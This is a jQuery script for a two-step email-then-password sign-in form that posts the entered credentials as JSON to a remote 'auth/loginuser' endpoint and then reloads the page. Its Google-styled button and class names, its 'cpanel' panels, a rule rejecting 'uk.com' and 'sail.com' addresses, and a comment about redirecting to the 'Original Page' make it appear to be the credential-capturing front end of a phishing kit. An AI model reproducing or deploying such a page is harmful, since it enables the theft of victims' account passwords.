import auth from './class/validate';

$(document).ready(function () {
    $('.__issetUserName').hide();
    $('.errorMsg1').hide();
    $('.errorMsg2').hide();
    $('.cpanel1').show();
    $('.cpanel2').hide();
    let UserEmail, Userpassword;
    $('.btn-google').on('click', function () {
        UserEmail = $('.____userEmail').val();
        const myAuthObject = new auth(UserEmail);
        if (UserEmail === "") {
            $('.stUf5b').fadeIn();
            $('.errorMsg1').fadeIn().html("Enter your email address.");
            $('.____userEmail').focus();
            return false;
        } else {
            // Create an instance of MyClass

            if (myAuthObject.regex() === 303){
                $('.stUf5b').fadeIn();
                $('.errorMsg1').fadeIn().html("Invalid Email Address..! Please Enter A Valid Email Address.");
                $('.____userEmail').focus();
                return false;
            }else  if (myAuthObject.regex() === 401){
                $('.stUf5b').fadeIn();
                $('.errorMsg1').fadeIn().html("Sorry..!! uk.com or sail.com is not allow, Please Use Another Email Address.");
                $('.____userEmail').focus();
                return false;
            }else{
                //$('.bbb-input').hide();
                $('.__issetUserName').fadeIn();
                $('.stUf5b').hide();
                $('.cpanel1').hide();
                $('.cpanel2').show();
                $('.errorMsg1').hide();
                $('.__issetUserName').html(UserEmail);
            }

        }
    });
    $('.btn-googleSubmint').on('click', function () {
        Userpassword = $('.____userPassword').val();
        UserEmail = $('.____userEmail').val();
        if (Userpassword === "") {
            // $('.bpin').show()
            $('.stUf5b').fadeIn();
            $('.errorMsg2').fadeIn().html("Enter your password.");
            $('.____userPassword').focus().css("border", "red solid 2px");
            return false;
        } else {
            const data = {"_email": UserEmail,"_password": Userpassword};
            const myAuthObject = new auth();
            let Data = JSON.stringify(data);
            $.ajax({
                type: 'POST', // define the type of HTTP verb we want to use (POST for our form)
                dataType: 'JSON', //the type of data we are sending is json
                contentType: "application/json; charset=utf-8",
                data: Data, // our data object
                url: root_url+'auth/loginuser', //the post destination
                processData: false, //false because the preprocessor are not trigger
                encode: true, //turn on json encoding
                crossOrigin: true, // true because we are sending data with ajax as json format to php
                async: true, //because we are expecting long data, so we set the whole data  Asynchronous with means configuring our Ajax code
                crossDomain: true, //just in case we host the site
                headers: {
                    'Access-Control-Allow-Methods': '*',
                    "Access-Control-Allow-Credentials": true,
                    "Access-Control-Allow-Headers": "Access-Control-Allow-Headers, Origin, X-Requested-With, Content-Type, Accept, Authorization",
                    "Access-Control-Allow-Origin": "*",
                    "Control-Allow-Origin": "*",
                    "cache-control": "no-cache",
                    'Authorization': 'Bearer '+myAuthObject.authToken()+'',
                    'Content-Type': 'application/json'
                },
            }).done(function (response) {
                if (response.status === 200) {
                     $('.stUf5b').hide();
                    $('.errorMsg2').fadeIn().html(response.message);
                    // delay and reload and Redirect to Original Page
                    window.location.reload();
                } else {
                    $('.stUf5b').show();
                    $('.errorMsg2').show().html(response.message);
                    $('.____userPassword').focus().css("border", "red solid 2px");
                    return false;

                }
            }).fail((xhr, status, error) => {
                console.log('Oops...', 'Something went wrong with ajax !', 'error');
            });
        }
    });
    $("#clearPasswordText").click(function() {
        const password = document.querySelector('.____userPassword');
        // toggle the type attribute
        const type = password.getAttribute('type') === 'password' ? 'text' : 'password';
        password.setAttribute('type', type);
        // toggle the eye slash icon
        this.classList.toggle('fa-eye-slash');
    })
});

